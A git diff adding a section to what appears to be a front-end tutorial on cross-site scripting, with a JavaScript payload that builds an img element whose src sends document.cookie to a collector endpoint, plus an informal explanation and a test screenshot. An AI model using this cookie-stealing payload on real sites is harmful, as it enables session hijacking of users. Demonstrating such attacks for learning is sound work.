@@ -88,3 +88,21 @@ then pass it as a query param:
 ```js
 localhost:<port>?<encoded uri given above>
 ```
+
+What does the above url Conclude lets check it out::
+
+```
+var img=document.createElement(\'img\');
+img.src=\'http://127.0.0.1:5500/cookie?data=\'+ document.cookie;
+document.querySelector(\'body\').appendChild(img);
+
+```
+we are passing an image tag, Script tags can't be injected nowadays because browsers are pretty secure and smart. So this hack can be done. If src is "does not exist" it'll call onerror, In a script we are creating a dom node of img and setting src as a url which contail document.cookie which is your cookie (Fucked up).so in that endpoint mentioned after the img.src. the request was rend with the cookie data.
+
+
+TEST:
+<img width="900" alt="image" src="https://github.com/SaurabhMulay999/FrontEnd-Design/assets/90036775/2a8c7b94-0b36-4409-ad48-cb874c711d89">
+
+We have testing and yes the script was injecting the image tag and exposing the user cookies as well.
+
+
